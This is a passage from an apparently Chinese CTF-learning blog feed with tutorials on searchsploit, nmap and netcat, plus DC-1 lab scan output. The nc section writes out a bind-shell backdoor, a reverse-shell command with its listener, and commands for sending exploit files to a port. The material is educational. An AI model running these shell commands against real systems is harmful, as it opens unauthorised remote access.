style=\"text-align:left\"></td>\n</tr>\n<tr>\n<td style=\"text-align:center\">-e</td>\n<td style=\"text-align:center\">对 exploit 标题进行 EXACT 匹配</td>\n<td style=\"text-align:left\">精确匹配</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">--exclude</td>\n<td style=\"text-align:center\">选项删除不想要的结果</td>\n<td style=\"text-align:left\"><code>searchsploit smb windows remote --exclude=&quot;(POC)|txt&quot;</code></td>\n</tr>\n</tbody>\n</table>\n<p>也可以结合 <code>grep -v</code>  ：  <code>searchsploit XnView | grep -v '/dos/'</code></p>\n<p>searchsploit 后面可以填入多个搜索关键词</p>\n<div class=\"note info\">\n<p>注意：SearchSploit 使用 AND 运算符，而不是 OR 运算符。使用的术语越多，滤除的结果越多。</p>\n</div>\n<p>获取更多结果的搜索技巧：</p>\n<ul class=\"lvl-0\">\n<li class=\"lvl-2\">\n<p>Kernel 2.6.25 - &gt;Kernel 2.6 // Kernel 2.x  查询更多版本</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>SQLi -&gt; SQL Injection</code>  更准确的漏洞名称</p>\n</li>\n<li class=\"lvl-2\">\n<p>-m 选项同时可以获取该 poc 的 cve 信息</p>\n</li>\n</ul>\n<h1 id=\"常用命令\"><a class=\"anchor\" href=\"#常用命令\">#</a> 常用命令</h1>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>示例</span></figcaption><table><tr class=\"marked\"><td data-num=\"1\"></td><td><pre>searchsploit afd windows <span class=\"token builtin class-name\">local</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre> <span class=\"token comment\"># 搜索 Windows 平台上与 AFD（Ancillary Function Driver）驱动程序相关的本地漏洞。这里为 \"local\"，表示只搜索本地漏洞。</span></pre></td></tr><tr class=\"marked\"><td data-num=\"3\"></td><td><pre> searchsploit <span class=\"token parameter variable\">-t</span> oracle windows</pre></td></tr><tr><td data-num=\"4\"></td><td><pre> <span class=\"token comment\"># 搜索与 Windows 平台上的 Oracle 软件相关的漏洞。-t 选项指定了搜索结果的标题</span></pre></td></tr><tr class=\"marked\"><td data-num=\"5\"></td><td><pre> searchsploit <span class=\"token parameter variable\">-p</span> <span class=\"token number\">39446</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre> <span class=\"token comment\"># 直接查找一个已知的漏洞编号为 39446 的 Exploit</span></pre></td></tr><tr class=\"marked\"><td data-num=\"7\"></td><td><pre> searchsploit linux kernel <span class=\"token number\">3.2</span> <span class=\"token parameter variable\">--exclude</span> <span class=\"token operator\">=</span>“（PoC）<span class=\"token operator\">|</span> / dos /”</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># 搜索与 Linux 内核版本 3.2 相关的漏洞 Exploit。--exclude 选项用于排除搜索结果中包含 \"（PoC）\" 或者 \"/dos/\" 的条目，以过滤掉一些不相关的结果。</span></pre></td></tr></table></figure><h1 id=\"检索结果\"><a class=\"anchor\" href=\"#检索结果\">#</a> 检索结果</h1>\n<p>一般情况下，搜索结果条目比较多，一下是一些路径的含义：</p>\n<ul class=\"lvl-0\">\n<li class=\"lvl-2\">\n<p><code>windows</code> : Windows 系统漏洞</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>linux</code> : Linux 系统漏洞</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>unix</code> : Unix 系统漏洞</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>exploit</code> : 含有漏洞利用代码的文件</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>shellcode</code> : 含有 Shellcode 的文件</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>papers</code> : 漏洞白皮书或技术文章</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>exploits</code> : 包含各种类型的漏洞利用代码，例如本地漏洞、远程漏洞、Web 应用程序漏洞等。</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>dos</code> : 包含拒绝服务攻击（DoS）漏洞的利用代码或漏洞详情。</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>remote</code> : 包含远程漏洞利用代码或漏洞详情。</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>local</code> : 包含本地漏洞利用代码或漏洞详情。</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>webapps</code> : 包含 Web 应用程序漏洞的利用代码或漏洞详情。</p>\n</li>\n</ul>\n<p><strong>路径下的文件：</strong><br />\n <code>txt</code>  结尾的文件一般是漏洞文件的详细信息，其他的 <code>py</code> , <code>php</code> , <code>pl</code> , <code>rb</code>  等文件就是具体利用的 exp，都是以 exp 漏洞编号命名的</p>\n<h1 id=\"实践一下\"><a class=\"anchor\" href=\"#实践一下\">#</a> 实践一下</h1>\n<p>以 dc-1 靶机为例：</p>\n<p>利用 <code>nmap -sV -A</code>  深度扫描探测版本号，或者利用 whatweb 获取靶机服务，不会用 whatweb<a href=\"\"> 戳这里</a>。发现是 cms 框架是 Drupal  7</p>\n<p><img loading=\"lazy\" data-src=\"https://s2.loli.net/2024/04/19/w2pJgaxD3Z6BWnH.png\" alt=\"image-20240419194943675\" /></p>\n<p><strong>Path</strong>：一般来说 <code>.txt</code>  文件是漏洞的详细说明，而其他文件一般是攻击代码和 exp，左边则是漏洞对于的版本号和漏洞类型</p>\n",
            "tags": [
                "Penetration Test",
                "kali tools",
                "Penetration Test"
            ]
        },
        {
            "id": "https://ctf-learner.github.io/post/%E6%89%AB%E6%8F%8F%E4%B8%8D%E6%AD%A2-nc-nmap/",
            "url": "https://ctf-learner.github.io/post/%E6%89%AB%E6%8F%8F%E4%B8%8D%E6%AD%A2-nc-nmap/",
            "title": "扫描不止 nc&nmap",
            "date_published": "2024-04-19T07:45:49.000Z",
            "content_html": "<p><span class=\"label success\">上次更新时间：2024-04-19</span><br />\n 发现自己几乎每次扫描都要查一查参数选项，而且操作及其磋脚……<br />\n 然后生了这篇文章，用来背诵</p>\n<h1 id=\"namp\"><a class=\"anchor\" href=\"#namp\">#</a> namp</h1>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>nmap <span class=\"token punctuation\">[</span>Scan Type<span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>Options<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span>target specification<span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"目标说明\"><a class=\"anchor\" href=\"#目标说明\">#</a> 目标说明</h2>\n<details class=\"primary\"><summary>官方解释👇</summary><div>\n<div class=\"note info\">\n<p>ip/&lt;numbit&gt;: Nmap 将会扫描所有和该参考 IP 地址具有 &lt;numbit &gt; 相同比特的所有 IP 地址或主机.</p>\n</div>\n<div class=\"note primary\">\n<p>例如，192.168.10.0/24 将会扫描 192.168.10.0 和 192.168.10.255 之间的 256 台主机。192.168.10.40/24 将会做同样的事情。</p>\n</div>\n</div></details>\n<h2 id=\"主机发现\"><a class=\"anchor\" href=\"#主机发现\">#</a> 主机发现</h2>\n<table>\n<thead>\n<tr>\n<th>选项</th>\n<th>作用</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>-iL &lt;inputfilename&gt;</td>\n<td>从文件中输入</td>\n<td>--excludefile &lt;excludefile&gt; 同理</td>\n</tr>\n<tr>\n<td>--exclude &lt;host1[，host2][，host3]，...&gt;</td>\n<td>排除主机 / 网络</td>\n<td>以逗号分隔的列表排除它们</td>\n</tr>\n<tr>\n<td>-sL</td>\n<td>列表扫描</td>\n<td>仅仅列出指定网络上的每台主机， 不发送任何报文到目标主机</td>\n</tr>\n<tr>\n<td>-sP</td>\n<td>Ping 扫描</td>\n<td>进行 ping 扫描，打印出对扫描做出响应的主机</td>\n</tr>\n<tr>\n<td>-P0</td>\n<td>无 ping</td>\n<td>-Pn 常用</td>\n</tr>\n<tr>\n<td>-n</td>\n<td>不用域名解析</td>\n<td>不对它发现的活动 IP 地址进行反向域名解析</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"端口扫描\"><a class=\"anchor\" href=\"#端口扫描\">#</a> 端口扫描</h2>\n<p>nmap 把端口分成六个状态: open (开放的)， closed (关闭的)，filtered (被过滤的)， unfiltered (未被过滤的)， open|filtered (开放或者被过滤的)，或者 closed|filtered (关闭或者被过滤的)</p>\n<table>\n<thead>\n<tr>\n<th>选项</th>\n<th>作用</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>-sS</td>\n<td>TCP SYN 扫描</td>\n<td><strong>常用</strong>、快速执行、不打开一个完全的 TCP 链接</td>\n</tr>\n<tr>\n<td>-sT</td>\n<td>TCP connect () 扫描</td>\n<td></td>\n</tr>\n<tr>\n<td>-sU</td>\n<td>UDP 扫描</td>\n<td>UDP 扫描一般较慢，可以使用 --host-timeout 跳过慢速的主机</td>\n</tr>\n<tr>\n<td>-p &lt;port ranges&gt;</td>\n<td>只扫描指定的端口或端口范围</td>\n<td>-p - 从端口 1 扫描到 65535</td>\n</tr>\n<tr>\n<td>-sV</td>\n<td>版本探测</td>\n<td>也可以 - A 同时启用操作系统检测和版本检测</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"-a选项的使用\"><a class=\"anchor\" href=\"#-a选项的使用\">#</a> -A 选项的使用</h2>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">选项</th>\n<th>作用</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">-A + -sV</td>\n<td>启用版本检测，用于识别目标主机上运行的服务及其版本信息</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">-A + -O</td>\n<td>启用操作系统检测，尝试识别目标主机的操作系统类型和版本</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">-A + -T4</td>\n<td>设置扫描的速度级别为快速（4），加快扫描速度但可能导致被检测到</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">-A</td>\n<td>执行高级扫描和识别</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"输出格式\"><a class=\"anchor\" href=\"#输出格式\">#</a> 输出格式</h2>\n<table>\n<thead>\n<tr>\n<th>选项</th>\n<th>作用</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>-oN &lt;filespec&gt;</td>\n<td>标准输出</td>\n<td>直接写入指定的文件</td>\n</tr>\n<tr>\n<td>-oG &lt;filespec&gt;</td>\n<td>Grep 输出</td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"常用实例\"><a class=\"anchor\" href=\"#常用实例\">#</a> 常用实例</h2>\n<div class=\"note warning\">\n<p><strong>注意：</strong><br />\n如果是为了测试，<a href=\"http://scanme.nmap.org\">scanme.nmap.org</a> 允许被扫描。但仅允许使用 Nmap 扫描并禁止测试漏洞或进行 DoS 攻击。</p>\n</div>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>nmap <span class=\"token operator\">&lt;</span>ip<span class=\"token operator\">></span>/<span class=\"token operator\">&lt;</span>子网掩码<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># 网段扫描</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>nmap <span class=\"token parameter variable\">-sP</span> ip/子网掩码 </pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># 扫描存活主机</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>nmap <span class=\"token parameter variable\">-sV</span> <span class=\"token operator\">&lt;</span>ip<span class=\"token operator\">></span> <span class=\"token parameter variable\">-p</span> <span class=\"token operator\">&lt;</span>端口号或范围<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>nmap <span class=\"token parameter variable\">-sS</span> -p- <span class=\"token number\">192.168</span>.0.2 <span class=\"token comment\"># 扫描主机全部端口</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>nmap <span class=\"token parameter variable\">-sP</span> <span class=\"token number\">172.20</span>.x.x/24</pre></td></tr></table></figure><p>nmap 的进阶暂时用不到，有空补充</p>\n<h1 id=\"nc基础使用\"><a class=\"anchor\" href=\"#nc基础使用\">#</a> nc 基础使用</h1>\n<p>监听本地端口</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">nc</span> <span class=\"token parameter variable\">-lvvp</span> <span class=\"token operator\">&lt;</span>port<span class=\"token operator\">></span></pre></td></tr></table></figure><p>连接指定端口</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">nc</span> <span class=\"token operator\">&lt;</span>ip<span class=\"token operator\">></span> <span class=\"token operator\">&lt;</span>port<span class=\"token operator\">></span></pre></td></tr></table></figure><h2 id=\"传送exp\"><a class=\"anchor\" href=\"#传送exp\">#</a> 传送 exp</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">cat</span> exp.txt <span class=\"token operator\">|</span> <span class=\"token function\">nc</span> <span class=\"token parameter variable\">-nv</span> <span class=\"token number\">192.168</span>.x.x <span class=\"token number\">80</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">nc</span> <span class=\"token parameter variable\">-nv</span> <span class=\"token number\">192.168</span>.x.x <span class=\"token number\">80</span> <span class=\"token operator\">&lt;</span> exp.txt</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># 两种方式均可以讲 exp 输送到指定端口，而服务器需要开放对应端口</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">nc</span> <span class=\"token parameter variable\">-l</span> <span class=\"token parameter variable\">-p</span> <span class=\"token number\">80</span> <span class=\"token operator\">></span> /tmp/received_exploit.txt</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># 服务器监听端口并保存 exp</span></pre></td></tr></table></figure><h2 id=\"日志打印\"><a class=\"anchor\" href=\"#日志打印\">#</a> 日志打印</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">nc</span> <span class=\"token parameter variable\">-l</span> <span class=\"token parameter variable\">-p</span> <span class=\"token number\">80</span> <span class=\"token operator\">>></span> /apache/log.txt</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># 在 awd 中，攻击 80 端口的信息都会被打印下来，> 表示覆写，>> 表示追加</span></pre></td></tr></table></figure><h1 id=\"nc命令进阶使用\"><a class=\"anchor\" href=\"#nc命令进阶使用\">#</a> nc 命令进阶使用</h1>\n<h2 id=\"创造后门\"><a class=\"anchor\" href=\"#创造后门\">#</a> 创造后门</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>ncat <span class=\"token parameter variable\">-l</span> <span class=\"token number\">10000</span> <span class=\"token parameter variable\">-e</span> /bin/bash</pre></td></tr></table></figure><p><code>-e</code>  标志将一个  <code>bash</code>  与端口  <code>10000</code>  相连。现在客户端只要连接到服务器上的  <code>10000</code>  端口就能通过  <code>bash</code>  获取我们系统的完整访问权限：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>ncat <span class=\"token number\">192.168</span>.1.100 <span class=\"token number\">10000</span> <span class=\"token comment\"># 攻击机上连接服务器</span></pre></td></tr></table></figure><h2 id=\"扫描端口\"><a class=\"anchor\" href=\"#扫描端口\">#</a> 扫描端口</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">nc</span> <span class=\"token punctuation\">[</span>options<span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span>ip<span class=\"token operator\">></span> <span class=\"token operator\">&lt;</span>port-port<span class=\"token operator\">></span></pre></td></tr></table></figure><p>可以利用 - w 设置超时时间，-z 扫描，-u 设置为 UDP 模式，例如：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">nc</span> <span class=\"token parameter variable\">-u</span> <span class=\"token parameter variable\">-z</span> <span class=\"token parameter variable\">-w2</span> <span class=\"token number\">192.168</span>.0.1 <span class=\"token number\">1</span>-65535 <span class=\"token comment\"># 扫描 192.168.0.3 的端口 范围是 1-65535 即全部端口</span></pre></td></tr></table></figure><div class=\"note warning\">\n<p><strong>注意：nc 扫描会留下大量的痕迹。</strong></p>\n</div>\n<h2 id=\"反向连接弹shell\"><a class=\"anchor\" href=\"#反向连接弹shell\">#</a> 反向连接弹 shell</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">nc</span> <span class=\"token parameter variable\">-e</span> /bin/bash <span class=\"token operator\">&lt;</span>ip<span class=\"token operator\">></span> <span class=\"token operator\">&lt;</span>port<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># 服务端发起连接</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">nc</span> <span class=\"token parameter variable\">-lvp</span> <span class=\"token operator\">&lt;</span>port<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># 攻击机连 shell</span></pre></td></tr></table></figure><h1 id=\"实战一下\"><a class=\"anchor\" href=\"#实战一下\">#</a> 实战一下</h1>\n<p>正好第一次打靶机学习渗透，以 dc-1 靶机为例</p>\n<p>kali 和 dc-1 的网络适配器都在 NET 模式，kali 的 <code>ip：192.168.234.134</code></p>\n<p>先简单扫描一下</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>└─<span class=\"token comment\"># nmap -sP 192.168.234.0/24</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Starting Nmap <span class=\"token number\">7.94</span> <span class=\"token punctuation\">(</span> https://nmap.org <span class=\"token punctuation\">)</span> at <span class=\"token number\">2024</span>-04-15 <span class=\"token number\">11</span>:13 EDT</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Nmap scan report <span class=\"token keyword\">for</span> <span class=\"token number\">192.168</span>.234.1</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Host is up <span class=\"token punctuation\">(</span><span class=\"token number\">0</span>.0037s latency<span class=\"token punctuation\">)</span>.</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>MAC Address: 00:50:56:C0:00:08 <span class=\"token punctuation\">(</span>VMware<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>Nmap scan report <span class=\"token keyword\">for</span> <span class=\"token number\">192.168</span>.234.2</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>Host is up <span class=\"token punctuation\">(</span><span class=\"token number\">0</span>.00078s latency<span class=\"token punctuation\">)</span>.</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>MAC Address: 00:50:56:E0:4C:0C <span class=\"token punctuation\">(</span>VMware<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>Nmap scan report <span class=\"token keyword\">for</span> <span class=\"token number\">192.168</span>.234.129</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>Host is up <span class=\"token punctuation\">(</span><span class=\"token number\">0</span>.00040s latency<span class=\"token punctuation\">)</span>.</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>MAC Address: 00:0C:29:02:FE:AE <span class=\"token punctuation\">(</span>VMware<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>Nmap scan report <span class=\"token keyword\">for</span> <span class=\"token number\">192.168</span>.234.254</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>Host is up <span class=\"token punctuation\">(</span><span class=\"token number\">0</span>.00071s latency<span class=\"token punctuation\">)</span>.</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>MAC Address: 00:50:56:F6:24:83 <span class=\"token punctuation\">(</span>VMware<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>Nmap scan report <span class=\"token keyword\">for</span> <span class=\"token number\">192.168</span>.234.134</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>Host is up.</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>Nmap done: <span class=\"token number\">256</span> IP addresses <span class=\"token punctuation\">(</span><span class=\"token number\">5</span> hosts up<span class=\"token punctuation\">)</span> scanned <span class=\"token keyword\">in</span> <span class=\"token number\">2.13</span> seconds</pre></td></tr></table></figure><p>用 arp-scan 同理</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>└─<span class=\"token comment\"># arp-scan -l</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Interface: eth0, type: EN10MB, MAC: 00:0c:29:31:18:c8, IPv4: <span class=\"token number\">192.168</span>.234.134</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Starting arp-scan <span class=\"token number\">1.10</span>.0 with <span class=\"token number\">256</span> hosts <span class=\"token punctuation\">(</span>https://github.com/royhills/arp-scan<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token number\">192.168</span>.234.1   00:50:56:c0:00:08       VMware, Inc.</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token number\">192.168</span>.234.2   00:50:56:e0:4c:0c       VMware, Inc.</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token number\">192.168</span>.234.129 00:0c:29:02:fe:ae       VMware, Inc.</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token number\">192.168</span>.234.254 00:50:56:f6:24:83       VMware, Inc.</pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token number\">4</span> packets received by filter, <span class=\"token number\">0</span> packets dropped by kernel</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>Ending arp-scan <span class=\"token number\">1.10</span>.0: <span class=\"token number\">256</span> hosts scanned <span class=\"token keyword\">in</span> <span class=\"token number\">2.310</span> seconds <span class=\"token punctuation\">(</span><span class=\"token number\">110.82</span> hosts/sec<span class=\"token punctuation\">)</span>.</pre></td></tr></table></figure><p>然后深度扫描</p>\n<details open>\n<summary><span class=\"pre-summary\">&nbsp;</span>👇结果有点长，点击展开逐条讲解</summary><figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>└─<span class=\"token comment\"># nmap -sV -A 192.168.234.129 </span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Starting Nmap <span class=\"token number\">7.94</span> <span class=\"token punctuation\">(</span> https://nmap.org <span class=\"token punctuation\">)</span> at <span class=\"token number\">2024</span>-04-15 <span class=\"token number\">12</span>:19 EDT</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Nmap scan report <span class=\"token keyword\">for</span> <span class=\"token number\">192.168</span>.234.129  </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Host is up <span class=\"token punctuation\">(</span><span class=\"token number\">0</span>.0016s latency<span class=\"token punctuation\">)</span>.</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Not shown: <span class=\"token number\">997</span> closed tcp ports <span class=\"token punctuation\">(</span>reset<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>PORT    STATE SERVICE VERSION</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token number\">22</span>/tcp  <span class=\"token function\">open</span>  <span class=\"token function\">ssh</span>     OpenSSH <span class=\"token number\">6</span>.0p1 Debian <span class=\"token number\">4</span>+deb7u7 <span class=\"token punctuation\">(</span>protocol <span class=\"token number\">2.0</span><span class=\"token punctuation\">)</span>    <span class=\"token comment\"># 服务类型、版本，系统版本、协议</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token operator\">|</span> ssh-hostkey:      <span class=\"token comment\"># 密钥类型</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token operator\">|</span>   <span class=\"token number\">1024</span> c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f <span class=\"token punctuation\">(</span>DSA<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token operator\">|</span>   <span class=\"token number\">2048</span> <span class=\"token number\">11</span>:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 <span class=\"token punctuation\">(</span>RSA<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token operator\">|</span>_  <span class=\"token number\">256</span> 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 <span class=\"token punctuation\">(</span>ECDSA<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token number\">80</span>/tcp  <span class=\"token function\">open</span>  http    Apache httpd <span class=\"token number\">2.2</span>.22 <span class=\"token variable\"><span class=\"token punctuation\">((</span>Debian<span class=\"token punctuation\">))</span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token operator\">|</span>_http-title: Welcome to Drupal Site <span class=\"token operator\">|</span> Drupal Site</pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token operator\">|</span>_http-server-header: Apache/2.2.22 <span class=\"token punctuation\">(</span>Debian<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># apache 服务器以及版本</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token operator\">|</span> http-robots.txt: <span class=\"token number\">36</span> disallowed entries <span class=\"token punctuation\">(</span><span class=\"token number\">15</span> shown<span class=\"token punctuation\">)</span>   <span class=\"token comment\"># robots.txt 的 disable 路径</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token operator\">|</span> /includes/ /misc/ /modules/ /profiles/ /scripts/ </pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token operator\">|</span> /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt </pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token operator\">|</span> /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt </pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token operator\">|</span>_/LICENSE.txt /MAINTAINERS.txt</pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token operator\">|</span>_http-generator: Drupal <span class=\"token number\">7</span> <span class=\"token punctuation\">(</span>http://drupal.org<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 网址使用的 cms 以及版本，还有官方网址</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token number\">111</span>/tcp <span class=\"token function\">open</span>  rpcbind <span class=\"token number\">2</span>-4 <span class=\"token punctuation\">(</span>RPC <span class=\"token comment\">#100000)  # 主机开放 111 端口</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token operator\">|</span> rpcinfo:       <span class=\"token comment\"># 正在运行 rpcbind 服务   （远程过程调用）</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token operator\">|</span>   program version    port/proto  <span class=\"token function\">service</span>   <span class=\"token comment\"># 正在运行的 RPC 程序和端口</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token operator\">|</span>   <span class=\"token number\">100000</span>  <span class=\"token number\">2,3</span>,4        <span class=\"token number\">111</span>/tcp   rpcbind</pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token operator\">|</span>   <span class=\"token number\">100000</span>  <span class=\"token number\">2,3</span>,4        <span class=\"token number\">111</span>/udp   rpcbind</pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token operator\">|</span>   <span class=\"token number\">100000</span>  <span class=\"token number\">3,4</span>          <span class=\"token number\">111</span>/tcp6  rpcbind</pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token operator\">|</span>   <span class=\"token number\">100000</span>  <span class=\"token number\">3,4</span>          <span class=\"token number\">111</span>/udp6  rpcbind</pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token operator\">|</span>   <span class=\"token number\">100024</span>  <span class=\"token number\">1</span>          <span class=\"token number\">39478</span>/udp   status</pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token operator\">|</span>   <span class=\"token number\">100024</span>  <span class=\"token number\">1</span>          <span class=\"token number\">40676</span>/tcp   status</pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token operator\">|</span>   <span class=\"token number\">100024</span>  <span class=\"token number\">1</span>          <span class=\"token number\">42791</span>/tcp6  status</pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token operator\">|</span>_  <span class=\"token number\">100024</span>  <span class=\"token number\">1</span>          <span class=\"token number\">52968</span>/udp6  status</pre></td></tr><tr><td data-num=\"32\"></td><td><pre>MAC Address: 00:0C:29:02:FE:AE <span class=\"token punctuation\">(</span>VMware<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>Device type: general purpose</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>Running: Linux <span class=\"token number\">3</span>.X   <span class=\"token comment\"># 